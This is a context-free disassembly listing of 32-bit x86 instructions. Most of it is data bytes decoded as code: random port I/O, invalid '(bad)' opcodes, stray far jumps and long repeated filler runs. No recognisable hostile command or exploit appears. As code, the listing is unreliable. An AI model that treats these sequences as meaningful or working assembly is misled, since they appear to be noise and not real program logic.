  41927f:	or     BYTE PTR [eax+0x3ae93ee4],0x0
  419286:	add    dh,BYTE PTR [ebx+ebx*4+0x5f9055eb]
  41928d:	hlt    
  41928e:	dec    esp
  41928f:	pop    DWORD PTR [eax+0x3a846be2]
  419295:	push   ecx
  419296:	add    bh,BYTE PTR [edi+ecx*2]
  419299:	out    0x5e,al
  41929b:	pop    ecx
  41929c:	outs   dx,DWORD PTR ds:[esi]
  41929d:	loop   0x419301
  41929f:	pop    esi
  4192a0:	jle    0x419287
  4192a2:	inc    ebp
  4192a3:	inc    eax
  4192a4:	dec    ecx
  4192a5:	fdivp  st(7),st
  4192a7:	rol    BYTE PTR [eax],cl
	...
  4192b9:	add    BYTE PTR [eax],al
  4192bb:	add    BYTE PTR [esp+ecx*8],dh
  4192be:	ins    BYTE PTR es:[edi],dx
  4192bf:	dec    eax
  4192c0:	and    edi,eax
  4192c2:	dec    bx
  4192c4:	sub    ebx,edx
  4192c6:	jno    0x4192f8
  4192c8:	cld    
  4192c9:	jp     0x4192c8
  4192cb:	cmp    dh,BYTE PTR [eax*8-0xf12ea9e]
  4192d2:	ins    BYTE PTR es:[edi],dx
  4192d3:	or     dh,ah
  4192d5:	fisub  WORD PTR [ebx+0x1b]
  4192d8:	adc    al,dh
  4192da:	jo     0x4192dc
  4192dc:	adc    bh,bh
  4192de:	add    DWORD PTR [ecx],0x1f
  4192e1:	imul   esi,DWORD PTR [ecx+0x54],0x506d713d
  4192e8:	xor    DWORD PTR [eax+0x65],edi
  4192eb:	inc    ecx
  4192ec:	sar    dh,1
  4192ee:	xor    BYTE PTR [eax],al
  4192f0:	mov    ds:0xec616270,eax
  4192f5:	addr16 inc ecx
  4192f7:	imul   esp,edx,0xe7746067
  4192fd:	jo     0x419375
  4192ff:	inc    ecx
  419300:	mov    al,ds:0xdc0064fe
  419305:	imul   esp,DWORD PTR [di-0x14],0xc4694367
  41930d:	add    BYTE PTR ds:[bx+si+0x4303],ah
  419313:	lods   al,BYTE PTR gs:[esi]
  419315:	cmp    eax,0x67a27272
  41931a:	imul   esi,DWORD PTR [eax+eiz*4+0x70],0x6c
  41931f:	arpl   WORD PTR [eax],ax
	...
  419331:	add    BYTE PTR [eax],al
  419333:	add    BYTE PTR [ebp+0x7000706d],bh
  419339:	add    BYTE PTR [ebx+0x69],dl
  41933c:	mov    esp,0xf1684067
  419341:	ins    DWORD PTR es:[edi],dx
  419342:	push   ecx
  419343:	outs   dx,DWORD PTR ds:[esi]
  419344:	and    eax,0xf9746979
  419349:	cmp    eax,0x3fd7476
  41934e:	lods   eax,DWORD PTR ds:[esi]
  41934f:	add    BYTE PTR [esi],cl
  419351:	ins    DWORD PTR es:[edi],dx
  419352:	imul   esp,DWORD PTR [esi+ebx*2+0x6b],0x6f
  419357:	jae    0x4193c5
  419359:	inc    edx
  41935a:	data16 ins BYTE PTR es:[edi],dx
  41935c:	jge    0x4193a1
  41935e:	std    
  41935f:	call   FWORD PTR [edi]
  419361:	jmp    FWORD PTR [ebx+0x73]
  419364:	sub    al,0x6e
  419366:	pusha  
  419367:	ins    DWORD PTR es:[edi],dx
  419368:	cmp    DWORD PTR [edi],edx
  41936a:	jmp    0x4193aa
  41936c:	cmp    ebp,ecx
  41936e:	add    BYTE PTR [esi-0x70],al
  419371:	adc    eax,ebp
  419373:	dec    ebp
  419374:	pop    esp
  419375:	push   edi
  419377:	inc    ebp
  419378:	pusha  
  419379:	add    esp,edi
  41937b:	cmp    DWORD PTR ds:[ecx+eax*1],edi
  41937f:	inc    esi
  419380:	push   eax
  419381:	push   ecx
  419382:	in     eax,0x40
  419384:	gs dec edx
  419386:	repnz bound edi,QWORD PTR [ecx]
  419389:	sbb    eax,DWORD PTR [ebx]
  41938b:	inc    ebp
  41938c:	pop    esp
  41938d:	push   ebx
  41938e:	shr    BYTE PTR [ebp+edx*2-0x44],1
  419392:	in     eax,dx
  419393:	bound  eax,QWORD PTR [ecx]
  419395:	dec    eax
  419396:	jmp    0x4193fb
	...
  4193ac:	sbb    eax,0xa6ffc44c
  4193b1:	rol    DWORD PTR [ebx],1
  4193b3:	inc    ebp
  4193b4:	adc    al,0x9b
  4193b6:	shl    DWORD PTR [edx+0xb],cl
  4193b9:	xchg   esi,eax
  4193ba:	in     al,dx
  4193bb:	ins    BYTE PTR es:[edi],dx
  4193bc:	pop    ds
  4193bd:	lods   al,BYTE PTR ds:[esi]
  4193be:	stc    
  4193bf:	cmp    DWORD PTR ds:0xfb144504,edi
  4193c6:	int3   
  4193c7:	ins    BYTE PTR es:[edi],dx
  4193c8:	fiadd  DWORD PTR [edi-0x7eff9d13]
  4193ce:	jecxz  0x41943c
  4193d0:	clc    
  4193d1:	add    WORD PTR [eax+edi*1+0x2a],si
  4193d6:	in     eax,0x73
  4193d8:	jmp    0xc8c3:0xd473eedf
  4193df:	ins    DWORD PTR es:[edi],dx
  4193e0:	fistp  QWORD PTR [ecx]
  4193e2:	add    al,0xa0
  4193e4:	cmp    BYTE PTR [edx],ch
  4193e6:	in     eax,0x73
  4193e8:	mov    ss,eax
  4193ea:	in     eax,dx
  4193eb:	arpl   WORD PTR [esi-0x6fbc10c6],bx
  4193f1:	xor    eax,0xa560e5
  4193f6:	push   ss
  4193f7:	repnz (bad) 
  4193f9:	mov    edi,0xff7c03e6
  4193fe:	sub    eax,0x18d08ae7
  419403:	jmp    0x419389
  419405:	(bad)  
  419407:	out    0x86,al
  419409:	out    dx,al
  41940a:	or     eax,0xbec57e6
  41940f:	rol    DWORD PTR [eax],1
	...
  419421:	add    BYTE PTR [eax],al
  419423:	add    BYTE PTR [edx-0x12],ch
  419426:	(bad)  
  419427:	in     eax,dx
  419428:	push   ebp
  419429:	mov    edi,0xfe5303e6
  41942e:	mov    ecx,0xdbbd4ae6
  419433:	icebp  
  419434:	dec    eax
  419435:	jecxz  0x4193f3
  419437:	idiv   DWORD PTR [edx-0x19]
  41943a:	mov    eax,0xcdf419e6
  41943f:	icebp  
  419440:	daa    
  419441:	mov    edi,0xfd4a03e6
  419446:	mov    edx,0x89ee2af0
  41944b:	out    dx,al
  41944c:	es mov edi,0xfefd03e6
  419452:	lods   eax,DWORD PTR ds:[esi]
  419453:	out    0xa,al
  419455:	rcr    BYTE PTR [eax+0x7adf04ea],1
  41945b:	out    0x6,al
  41945d:	out    dx,al
  41945e:	(bad)  
  41945f:	in     eax,0xd7
  419461:	jmp    0x4193ee
  419463:	rcr    bl,1
  419465:	fdiv   QWORD PTR [edx-0x16]
  419468:	int    0xe9
  41946a:	xor    al,0xe3
  41946c:	jecxz  0x419450
  41946e:	pop    ecx
  41946f:	ret    
  419470:	dec    esi
  419471:	js     0x419493
  419473:	add    edi,esp
  419475:	loop   0x4194c9
  419477:	aam    0xc8
  419479:	out    0x3c,al
  41947b:	jecxz  0x419427
  41947d:	fst    QWORD PTR [esi]
  41947f:	repnz popf 
  419481:	fdivp  st(7),st
  419483:	aas    
  419484:	sub    ebx,esp
  419486:	inc    esi
  419487:	aas    
	...
  41949c:	and    DWORD PTR [edi],esi
  41949e:	add    BYTE PTR [edi+0x1562bd3a],ah
  4194a4:	clc    
  4194a5:	bnd jno 0x4194c3
  4194a8:	push   ds
  4194a9:	out    0x73,al
  4194ab:	and    eax,0xa62f212
  4194b0:	icebp  
  4194b1:	in     al,0x71
  4194b3:	add    dl,bh
  4194b5:	ja     0x4194b4
  4194b7:	xlat   BYTE PTR ds:[ebx]
  4194b8:	cmp    esp,esp
  4194ba:	jo     0x4194b1
  4194bc:	call   0xee18f7ac
  4194c1:	ja     0x4194c0
  4194c3:	in     al,dx
  4194c4:	cmp    bl,cl
  4194c6:	jb     0x41948d
  4194c8:	into   
  4194c9:	fiadd  WORD PTR [ecx-0x30]
  4194cc:	(bad)  
  4194cd:	loop   0x419522
  4194cf:	(bad)  
  4194d0:	(bad)  
  4194d1:	fisub  WORD PTR [ebx-0x3c]
  4194d4:	jns    0x4194b5
  4194d6:	pop    esi
  4194d7:	mov    ebx,0xa5ff8b3a
  4194dc:	xchg   edi,eax
  4194dd:	repz push ebx
  4194df:	nop
  4194e0:	cdq    
  4194e1:	call   0xe5c92326
  4194e6:	jae    0x4194d1
  4194e8:	cmp    bh,BYTE PTR [ecx-0x1d7145fe]
  4194ee:	bound  edi,QWORD PTR [ecx+0x3a]
  4194f1:	xor    bh,bh
  4194f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194f4:	push   edi
  4194f5:	repz dec edx
  4194f7:	xchg   BYTE PTR [esi-0xe],bl
  4194fa:	imul   eax,DWORD PTR [esp+esi*2+0x4c6bde],0x0
	...
  419512:	add    BYTE PTR [eax],al
  419514:	adc    esi,0x6a
  419517:	inc    esp
  419518:	je     0x419591
  41951a:	std    
  41951b:	add    DWORD PTR [edi*4-0x298eaa9e],edi
  419522:	jo     0x419524
  419524:	je     0x419567
  419526:	outs   dx,DWORD PTR ds:[esi]
  419527:	jb     0x4195a8
  419529:	outs   dx,BYTE PTR ds:[esi]
  41952a:	std    
  41952b:	dec    DWORD PTR [ecx-0x4]
  41952e:	ds jb  0x4195a6
  419531:	pop    ebp
  419532:	jno    0x419599
  419534:	push   esp
  419535:	imul   ebp,DWORD PTR [esp+ebp*2+0x28],0x61
  41953a:	imul   esi,DWORD PTR [eax-0x1d],0x316e4f2c
  419541:	ins    BYTE PTR es:[edi],dx
  419542:	jo     0x4195ac
  419544:	dec    edi
  419545:	jo     0x419544
  419547:	push   ebp
  419549:	cld    
  41954a:	dec    edi
  41954b:	jb     0x41958c
  41954d:	pop    edi
  41954e:	bound  esi,QWORD PTR [ebx-0x1d]
  419551:	sub    eax,0x6ce94632
  419556:	jo     0x4195cc
  419558:	loopne 0x41955c
  41955a:	sbb    BYTE PTR [edx],al
  41955c:	lahf   
  41955d:	jb     0x4195c1
  41955f:	outs   dx,BYTE PTR ds:[esi]
  419560:	sub    BYTE PTR [esp+ebp*2+0x63],0x85
  419565:	ins    DWORD PTR es:[edi],dx
  419566:	jo     0x419568
  419568:	aaa    
  419569:	dec    BYTE PTR [edi+0x72]
  41956c:	jg     0x4195cb
  41956e:	bound  esi,QWORD PTR [ebx-0x1d]
  419571:	sub    eax,0x7ac54e32
  419576:	jno    0x419578
	...
  41958c:	aaa    
  41958d:	std    
  41958e:	dec    ebx
  41958f:	inc    ebx
  419590:	fstp   QWORD PTR [ebx+0x6d]
  419593:	push   ebx
  419594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419595:	ins    BYTE PTR es:[edi],dx
  419596:	data16 outs dx,BYTE PTR ds:[esi]
  419598:	(bad)  
  419599:	cmp    edi,ebp
  41959b:	(bad)  
  41959c:	(bad)  
  41959e:	inc    eax
  41959f:	js     0x41955a
  4195a1:	dec    bp
  4195a3:	jb     0x419584
  4195a5:	pop    ebp
  4195a6:	bound  esi,QWORD PTR [ebx-0xd]
  4195a9:	sti    
  4195aa:	lods   al,BYTE PTR ds:[esi]
  4195ab:	add    dl,BYTE PTR [ebx]
  4195ad:	popa   
  4195ae:	jno    0x419605
  4195b0:	cmp    DWORD PTR [edi-0x4330a115],edi
  4195b6:	out    0x62,eax
  4195b8:	popf   
  4195b9:	and    al,0xfc
  4195bb:	pusha  
  4195bc:	xchg   esp,eax
  4195bd:	aaa    
  4195be:	lock xchg si,ax
  4195c1:	mov    ebp,0x2b8d66c1
  4195c6:	fbstp  TBYTE PTR [ecx+0x39]
  4195c9:	adc    bl,bh
  4195cb:	jno    0x41956c
  4195cd:	cld    
  4195ce:	out    0x30,eax
  4195d0:	dec    ebx
  4195d1:	cmp    eax,0x678d6bdd
  4195d6:	add    DWORD PTR [ecx+0x62f62a39],ecx
  4195dc:	pop    eax
  4195dd:	imul   esp,eax,0x50
  4195e0:	ins    DWORD PTR es:[edi],dx
  4195e1:	jns    0x4195c3
  4195e3:	pop    esi
  4195e4:	dec    esp
  4195e5:	push   ss
  4195e6:	jmp    0x5861:0xea4b7e47
  4195ed:	inc    ebx
  4195ee:	add    DWORD PTR [ebp+0x0],edx
	...
  419604:	cmp    DWORD PTR [esi-0x618e8c20],esp
  41960a:	in     eax,0x6c
  41960c:	sbb    ecx,DWORD PTR [eax-0x1b]
  41960f:	inc    ebp
  419610:	sub    eax,DWORD PTR [esi-0x18]
  419613:	push   eax
  419614:	sub    eax,0xc5ee0b9
  419619:	add    DWORD PTR ds:0xaa39,ecx
  41961e:	jmp    0x1c73:0xe47c0b40
  419625:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419626:	lock adc ax,0x167
  41962b:	pusha  
  41962c:	cmp    DWORD PTR [edx-0x627ac16],ebp
  419632:	in     eax,dx
  419633:	dec    edx
  419634:	fdivr  QWORD PTR [ebx-0x41]
  419637:	jno    0x41960d
  419639:	jnp    0x41963c
  41963b:	or     eax,0xe92a0039
  419640:	stc    
  419641:	icebp  
  419642:	inc    ebx
  419643:	jecxz  0x41960f
  419645:	ficomp DWORD PTR [edi]
  419647:	jmp    0xdb99:0xea47ebc9
  41964e:	out    0x3,al
  419650:	sub    BYTE PTR [eax],al
  419652:	cs call 0xeb865df3
  419658:	stos   BYTE PTR es:[edi],al
  419659:	out    0x47,eax
  41965b:	call   0x44d90ff
  419660:	pushf  
  419661:	in     al,0x3
  419663:	xor    eax,0xe80b264b
	...
  41967c:	xchg   edx,eax
  41967d:	add    BYTE PTR [esi+eax*1],cl
  419680:	ins    BYTE PTR es:[edi],dx
  419681:	icebp  
  419682:	div    ch
  419684:	push   edi
  419685:	out    0xf2,al
  419687:	loope  0x4196b0
  419689:	add    ah,bh
  41968b:	hlt    
  41968c:	pop    ebx
  41968d:	repnz mov ecx,0xd2dc2735
  419693:	out    0xce,eax
  419695:	je     0x4196ce
  419697:	add    ebp,DWORD PTR [ebx-0x25]
  41969a:	int    0xc8
  41969c:	dec    esi
  41969d:	fstp   TBYTE PTR [esp+ecx*8-0x45408e5]
  4196a4:	outs   dx,DWORD PTR ds:[esi]
  4196a5:	add    BYTE PTR [ecx],ah
  4196a7:	add    ecx,DWORD PTR [ebx]
  4196a9:	fcmovne st,st(5)
  4196ab:	shr    BYTE PTR [ebx],cl
  4196ad:	fstp   TBYTE PTR [eax-0x6d211306]
  4196b3:	out    dx,al
  4196b4:	sbb    edi,DWORD PTR [ebx+0x7486c29e]
  4196ba:	pop    esi
  4196bb:	add    ebp,ebx
  4196bd:	fiadd  DWORD PTR [ebp+0x79e4e2c4]
  4196c3:	fiadd  WORD PTR [ecx]
  4196c5:	fstp   TBYTE PTR [edi+0x3]
  4196c8:	je     0x4196c8
  4196ca:	call   FWORD PTR [edx+0x794cdb7f]
  4196d0:	ja     0x4196b4
  4196d2:	dec    eax
  4196d3:	dec    esp
  4196d4:	push   edx
  4196d5:	xor    eax,0xd23ba500
  4196da:	bound  ecx,QWORD PTR [esi+0x7e]
  4196dd:	loop   0x419751
  4196df:	cmp    al,0x0
	...
  4196f1:	add    BYTE PTR [eax],al
  4196f3:	add    BYTE PTR [edi+ebx*8],al
  4196f6:	jbe    0x419724
  4196f8:	sub    eax,0x3b830033
  4196fd:	into   
  4196fe:	bound  ecx,QWORD PTR [esi-0xc]
  419701:	icebp  
  419702:	bound  ecx,QWORD PTR [eax+0x9]
  419705:	fisttp WORD PTR [eax+0xc]
  419708:	adc    dh,BYTE PTR [ebx]
  41970a:	add    BYTE PTR [esi+0xe62ce3b],al
  419710:	in     al,0xde
  419712:	jae    0x41974b
  419714:	(bad)  
  419716:	jb     0x419724
  419718:	scas   al,BYTE PTR es:[edi]
  419719:	jmp    0x419759
  41971b:	jmp    0x1b40d45a
  419720:	(bad)  
  419721:	fadd   QWORD PTR [edx-0x1]
  419724:	out    0xe6,eax
  419726:	push   ebp
  419727:	enter  0xeed6,0x62
  41972b:	test   al,0x3a
  41972d:	inc    edx
  41972e:	(bad)  
  41972f:	mov    edx,0xd94cdcdf
  419734:	xchg   edi,eax
  419735:	in     eax,0x40
  419737:	mov    esp,0xcf62f1a4
  41973c:	xchg   esi,eax
  41973d:	into   
  41973e:	jo     0x41970c
  419740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419741:	jae    0x419740
  419743:	sar    BYTE PTR [ebx],cl
  419745:	mov    ebp,0xf07f9d62
  41974a:	bound  ebx,QWORD PTR [ebx-0x73952d90]
  419750:	jnp    0x4197c5
  419752:	std    
  419753:	mov    BYTE PTR [esi+0x5eed],dl
	...
  419769:	add    BYTE PTR [eax],al
  41976b:	add    al,dh
  41976d:	xor    BYTE PTR gs:[edx],dh
  419770:	jbe    0x4197c5
  419772:	imul   ebp,DWORD PTR [eax+edx*2-0x1],0x67b300d4
  41977a:	bound  ebp,QWORD PTR [esp+eiz*8+0x40]
  41977e:	jne    0x4197e5
  419780:	repz jo 0x4197f4
  419783:	gs adc esp,edi
  419786:	outs   dx,BYTE PTR ds:[esi]
  419787:	push   0x3369687d
  41978c:	xor    bl,BYTE PTR ds:0xfc746c64
  419792:	je     0x419794
  419794:	pop    ecx
  419795:	pop    edx
  419796:	jno    0x4197fd
  419798:	push   edx
  419799:	pop    edx
  41979a:	bound  esi,QWORD PTR [ebx+eiz*2+0x6e]
  41979e:	pop    esi
  41979f:	arpl   WORD PTR [ebx],bp
  4197a1:	push   ecx
  4197a2:	outs   dx,DWORD PTR ds:[esi]
  4197a3:	ins    BYTE PTR es:[edi],dx
  4197a4:	push   ecx
  4197a5:	cld    
  4197a6:	jbe    0x4197a8
  4197a8:	sbb    DWORD PTR [edx+0x71],ebx
  4197ab:	gs repnz pop esp
  4197ae:	bound  esi,QWORD PTR [ebx+edx*1+0x6e]
  4197b2:	bound  esp,QWORD PTR [ecx-0x24]
  4197b5:	pop    edi
  4197b6:	push   edx
  4197b7:	jb     0x41978d
  4197b9:	cmp    edi,ebp
  4197bb:	(bad)  
  4197bc:	out    dx,eax
  4197bd:	arpl   WORD PTR [ebx+0x69],bp
  4197c0:	neg    BYTE PTR [edi+0x71]
  4197c3:	cs in  al,dx
  4197c5:	pop    edx
  4197c6:	imul   eax,DWORD PTR [eax],0x744efb95
  4197cc:	repnz dec ebp
  4197ce:	jno    0x419842
	...
  4197e4:	jmp    0x91419524
  4197e9:	sti    
  4197ea:	dec    esi
  4197eb:	je     0x4197bf
  4197ed:	push   eax
  4197ee:	inc    eax
  4197ef:	push   0x3e43b2
  4197f4:	mov    ebx,?
  4197f6:	dec    esi
  4197f7:	je     0x419832
  4197f9:	xchg   edi,eax
  4197fa:	int    0x6c
  4197fc:	add    bl,dh
  4197fe:	in     al,dx
  4197ff:	cmp    DWORD PTR ds:[ebp+0x4],ebp
  419803:	push   ecx
  419804:	in     eax,dx
  419805:	not    cl
  419807:	jae    0x4197f4
  419809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41980a:	add    edx,ebp
  41980c:	cmp    DWORD PTR [esi-0x34058e13],edx
  419812:	repz dec ebp
  419814:	lock daa 
  419816:	add    al,0xe
  419818:	cmp    BYTE PTR [esi],dh
  41981a:	lock jno 0x4197a7
  41981d:	retf   
  41981e:	icebp  
  41981f:	inc    esi
  419820:	xchg   BYTE PTR [edi+0x1],ah
  419823:	jno    0x4197b6
  419825:	ret    
  419826:	in     al,dx
  419827:	pop    esi
  419828:	test   eax,0xa56425c0
  41982d:	xor    eax,DWORD PTR [esi+esi*1]
  419830:	cmp    DWORD PTR [eax],edx
  419832:	out    0x62,al
  419834:	lea    esi,[edx]
  419836:	jecxz  0x41989b
  419838:	xchg   ebp,eax
  419839:	adc    eax,0xfa392a04
  41983e:	fidiv  WORD PTR [ebx+0x61]
  419841:	or     dh,cl
  419843:	jae    0x4198a0
  419845:	add    dh,ah
  419847:	pop    esi
	...
  41985c:	dec    esp
  41985d:	add    al,0x4
  41985f:	inc    edi
  419860:	cmp    DWORD PTR [esi-0x1a],esi
  419863:	pusha  
  419864:	bound  eax,QWORD PTR [ebp+ebp*8-0x1]
  419868:	(bad)  
  419869:	cli    
  41986a:	add    esp,DWORD PTR [ecx+0x4e]
  41986d:	cmp    ebx,esp
  41986f:	bound  ebx,QWORD PTR [edx]
  419871:	dec    ebx
  419872:	add    DWORD PTR [esi],esp
  419874:	cmp    DWORD PTR [esi-0x1b],eax
  419877:	ins    BYTE PTR es:[edi],dx
  419878:	sub    bh,BYTE PTR [edx+esi*8]
  41987b:	ins    BYTE PTR es:[edi],dx
  41987c:	sbb    bh,BYTE PTR [esi]
  41987e:	loopne 0x4198f3
  419880:	cmp    DWORD PTR [ebx+0x147101],ebx
  419886:	xchg   ebp,eax
  419887:	fild   WORD PTR [esi+0x803aa71]
  41988d:	fild   DWORD PTR [edx-0x19142620]
  419893:	add    ebp,DWORD PTR [edi]
  419895:	add    BYTE PTR [ecx-0x20],bh
  419898:	fldl2t 
  41989a:	out    0x3,al
  41989c:	hlt    
  41989d:	(bad)  
  41989e:	jns    0x419880
  4198a0:	retf   0x7dec
  4198a3:	loop   0x419886
  4198a5:	loopne 0x4198fd
  4198a7:	lock inc esi
  4198a9:	jno    0x4198b3
  4198ab:	add    al,0xe4
  4198ad:	int3   
  4198ae:	daa    
  4198af:	shr    DWORD PTR [edx-0x540fa721],1
  4198b5:	lock out 0x3,al
  4198b8:	lods   al,BYTE PTR ds:[esi]
  4198b9:	in     eax,dx
  4198ba:	dec    ebp
  4198bb:	loope  0x41984e
  4198bd:	sub    eax,0x25f9
	...
  4198d2:	add    BYTE PTR [eax],al
  4198d4:	popf   
  4198d5:	in     al,0x3a
  4198d7:	add    al,0x82
  4198d9:	add    BYTE PTR [ebx],dh
  4198db:	in     eax,0x67
  4198dd:	fdiv   QWORD PTR [ebx]
  4198df:	icebp  
  4198e0:	fwait
  4198e1:	out    dx,al
  4198e2:	ss repnz gs (bad) 
  4198e7:	out    0x5b,eax
  4198e9:	mov    edi,0x8603e6
  4198ee:	adc    al,0xe6
  4198f0:	push   edx
  4198f1:	loope  0x4198fa
  4198f3:	loopne 0x419960
  4198f5:	in     eax,dx
  4198f6:	add    esi,edx
  4198f8:	jle    0x4198e8
  4198fa:	aad    0xdd
  4198fc:	pop    edi
  4198fd:	in     al,0xc3
  4198ff:	add    ecx,DWORD PTR [edx-0x13]
  419902:	retf   
  419903:	icebp  
  419904:	sbb    esp,edx
  419906:	aam    0x25
  419908:	adc    eax,0x3903d2e4
  41990d:	add    bh,ah
  41990f:	add    edi,DWORD PTR [ecx]
  419911:	add    BYTE PTR [eax],al
  419913:	jmp    0xe9419952
  419918:	cmp    al,BYTE PTR [eax]
  41991a:	add    cl,ch
  41991c:	cmp    al,BYTE PTR [eax]
  41991e:	add    cl,ch
  419920:	cmp    al,BYTE PTR [eax]
  419922:	add    cl,ch
  419924:	cmp    al,BYTE PTR [eax]
  419926:	add    cl,ch
  419928:	cmp    al,BYTE PTR [eax]
  41992a:	add    cl,ch
  41992c:	cmp    al,BYTE PTR [eax]
  41992e:	add    cl,ch
  419930:	cmp    al,BYTE PTR [eax]
  419932:	add    cl,ch
  419934:	cmp    al,BYTE PTR [eax]
  419936:	add    cl,ch
	...
  41994c:	cmp    al,BYTE PTR [eax]
  41994e:	add    cl,ch
  419950:	cmp    al,BYTE PTR [eax]
  419952:	add    cl,ch
  419954:	cmp    al,BYTE PTR [eax]
  419956:	add    cl,ch
  419958:	cmp    al,BYTE PTR [eax]
  41995a:	add    cl,ch
  41995c:	cmp    al,BYTE PTR [eax]
  41995e:	add    cl,ch
  419960:	cmp    al,BYTE PTR [eax]
  419962:	add    cl,ch
  419964:	cmp    al,BYTE PTR [eax]
  419966:	add    cl,ch
  419968:	cmp    al,BYTE PTR [eax]
  41996a:	add    cl,ch
  41996c:	cmp    al,BYTE PTR [eax]
  41996e:	add    cl,ch
  419970:	cmp    al,BYTE PTR [eax]
  419972:	add    cl,ch
  419974:	cmp    al,BYTE PTR [eax]
  419976:	add    cl,ch
  419978:	cmp    al,BYTE PTR [eax]
  41997a:	add    cl,ch
  41997c:	cmp    al,BYTE PTR [eax]
  41997e:	add    cl,ch
  419980:	cmp    al,BYTE PTR [eax]
  419982:	add    cl,ch
  419984:	cmp    al,BYTE PTR [eax]
  419986:	add    cl,ch
  419988:	cmp    al,BYTE PTR [eax]
  41998a:	add    cl,ch
  41998c:	cmp    al,BYTE PTR [eax]
  41998e:	add    cl,ch
  419990:	cmp    al,BYTE PTR [eax]
  419992:	add    cl,ch
  419994:	cmp    al,BYTE PTR [eax]
  419996:	add    cl,ch
  419998:	cmp    al,BYTE PTR [eax]
  41999a:	add    cl,ch
  41999c:	cmp    al,BYTE PTR [eax]
  41999e:	add    BYTE PTR [eax],al
  4199a0:	nop
  4199a1:	add    eax,DWORD PTR [eax]
  4199a3:	add    BYTE PTR [eax-0x5ffffffd],dl
  4199a9:	add    eax,DWORD PTR [eax]
  4199ab:	add    BYTE PTR [eax+0x3],ah
	...
  4199c1:	add    BYTE PTR [eax],al
  4199c3:	add    BYTE PTR [eax-0x6ffffffd],dl
  4199c9:	add    eax,DWORD PTR [eax]
  4199cb:	add    BYTE PTR [ebp+0x7dcccc3c],al
  4199d1:	cmp    al,0xcc
  4199d3:	int3   
  4199d4:	or     al,0x7b
  4199d6:	in     al,dx
  4199d7:	push   ecx
  4199d8:	mov    dl,0xc5
  4199da:	pop    es
  4199db:	mov    al,BYTE PTR [ecx+0x78]
  4199de:	dec    ebx
  4199df:	inc    edx
  4199e1:	gs pop ebx
  4199e3:	ret    
  4199e4:	in     al,dx
  4199e5:	jp     0x4199d3
  4199e7:	push   ecx
  4199e8:	out    0xd6,eax
  4199ea:	xor    cl,cl
  4199ec:	popf   
  4199ed:	jnp    0x419a5e
  4199ef:	xor    dl,al
  4199f1:	cmc    
  4199f2:	or     ecx,DWORD PTR [ebx+0x46890caf]
  4199f8:	xor    DWORD PTR [ecx+0x43],edi
  4199fb:	cld    
  4199fc:	ret    0x1fed
  4199ff:	mov    eax,DWORD PTR [edi-0x80]
  419a02:	cmp    eax,0x80078d6b
  419a07:	aas    
  419a08:	jb     0x4199fe
  419a0a:	add    ebx,ebp
  419a0c:	loopne 0x4199dc
  419a0e:	pop    ebp
  419a0f:	mov    edx,esp
  419a11:	int3   
  419a12:	ror    ah,0x8c
  419a15:	jnp    0x419a03
  419a17:	or     ebp,0x23
  419a1a:	mov    DWORD PTR [ebp+0x41],eax
  419a1d:	jns    0x419a62
  419a1f:	loopne 0x4199e3
  419a21:	mov    esp,0x606c8bdf
  419a26:	add    DWORD PTR [ecx+0x0],edx
	...
  419a39:	add    BYTE PTR [eax],al
  419a3b:	add    ch,bh
  419a3d:	js     0x419a92
  419a3f:	in     al,0xc2
  419a41:	(bad)
  419a45:	call   0x7972e74a
  419a4a:	dec    ebx
  419a4b:	clc    
  419a4c:	mov    dl,0xd4
  419a4e:	test   DWORD PTR [ebx+0x450123fb],0xe8437941
  419a58:	mov    dl,0xbc
  419a5a:	test   DWORD PTR [ebx+0x55011fe8],0xf0537941
  419a64:	ret    0xf7c4
  419a67:	mov    esi,ecx
  419a69:	or     eax,DWORD PTR [ecx]
  419a6b:	dec    ebp
  419a6c:	xor    DWORD PTR [ecx+0x4b],edi
  419a6f:	cld    
  419a70:	jle    0x419a36
  419a72:	repz add BYTE PTR [ecx],bh
  419a75:	add    BYTE PTR [eax],al
  419a77:	jmp    0x419aa9
  419a79:	jnp    0x419ace
  419a7b:	hlt    
  419a7c:	mov    edx,0x8c88ff41
  419a81:	je     0x419a0c
  419a83:	inc    ebp
  419a84:	xor    DWORD PTR [edx+0x4b],edi
  419a87:	hlt    
  419a88:	bound  edi,QWORD PTR [eax+0x79717317]
  419a8e:	push   ebx
  419a8f:	lock ret 0x102
  419a93:	inc    ebp
  419a94:	inc    ecx
  419a95:	ja     0x419ada
  419a97:	fcom   QWORD PTR [ebx+0x3bac67fe]
  419a9d:	sar    bh,0x8a
	...
  419ab4:	test   BYTE PTR [edi+ecx*2-0x18],cl
  419ab8:	mov    edi,edi
  419aba:	(bad)  
  419abb:	(bad)  
  419abc:	mov    edx,0xf9850c44
  419ac1:	repz sbb BYTE PTR [ebx+0x4589746c],cl
  419ac8:	loope  0x419ac7
  419aca:	mov    ah,0xc
  419acc:	imul   esi,DWORD PTR [edi+0x4b],0xebd3b2ec
  419ad3:	mov    edi,esp
  419ad5:	imul   ecx,DWORD PTR [ecx+0x4301c904],0x8
  419adc:	xchg   edx,eax
  419add:	sti    
  419ade:	mov    BYTE PTR [ebp-0x57],cl
  419ae1:	cmp    DWORD PTR [edi-0x10443ffc],0xc031d5eb
  419aeb:	mov    ebx,DWORD PTR [ebx+ecx*8+0x3c6dccc0]
  419af2:	int3   
  419af3:	int3   
  419af4:	test   DWORD PTR [esp+ecx*8],edi
  419af7:	int3   
  419af8:	jge    0x419b36
  419afa:	int3   
  419afb:	int3   
  419afc:	or     al,0x79
  419afe:	in     al,dx
  419aff:	or     DWORD PTR [ebp+0x8],0xffffffe8
  419b03:	add    eax,0x89fd6d56
  419b08:	hlt    
  419b09:	push   edi
  419b0a:	mov    DWORD PTR [ebp+0x51],eax
  419b0d:	shl    bh,1
  419b0f:	sub    DWORD PTR [esi],edi
  419b11:	ins    DWORD PTR es:[edi],dx
  419b12:	std    
  419b13:	cmp    ebp,0x3
  419b16:	mov    eax,ds:0xb4
	...
  419b2b:	add    BYTE PTR [edi+edi*4+0x1e567ff],al
  419b32:	inc    eax
  419b33:	add    BYTE PTR [edx+0x1651e7ba],dh
  419b39:	adc    esi,DWORD PTR [ebp+edx*2-0x475eff88]
  419b40:	ins    BYTE PTR es:[edi],dx
  419b41:	mov    edi,0xda3969ff
  419b46:	jmp    DWORD PTR [edi+0x5]
  419b49:	add    al,BYTE PTR [eax+0x0]
  419b4c:	out    dx,al
